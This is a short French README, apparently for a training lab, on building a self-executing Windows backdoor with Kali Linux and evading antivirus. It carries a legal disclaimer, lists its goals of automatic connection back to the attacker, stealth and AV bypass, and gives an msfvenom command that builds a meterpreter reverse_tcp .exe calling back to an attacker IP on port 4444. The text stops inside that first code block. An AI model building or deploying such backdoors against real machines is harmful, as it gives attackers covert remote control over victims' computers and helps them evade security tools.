# Sujet 3 – Backdoor Windows .EXE auto-exécutable + Bypass antivirus (Kali)

Ce projet illustre la création d’un **backdoor Windows** à l’aide de Kali Linux, avec comme objectif :

✅ Générer un fichier `.exe`  
✅ Se connecter automatiquement à la machine Kali à l'exécution  
✅ Masquer le comportement (furtif)  
✅ Contourner les antivirus dans un environnement de test

>  **Avertissement légal** : Ce projet est exclusivement réservé à un usage éducatif dans un **lab de test** sous **autorisation**. Toute utilisation non autorisée constitue une infraction pénale.

---

## Outils nécessaires

- Kali Linux (attaquant)
- Machine Windows (victime – test en VM uniquement)
- Metasploit
- `msfvenom`
---

## Étape 1 – Générer un backdoor `.exe` Windows avec `msfvenom`

Sur Kali :

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f exe -o backdoor.exe
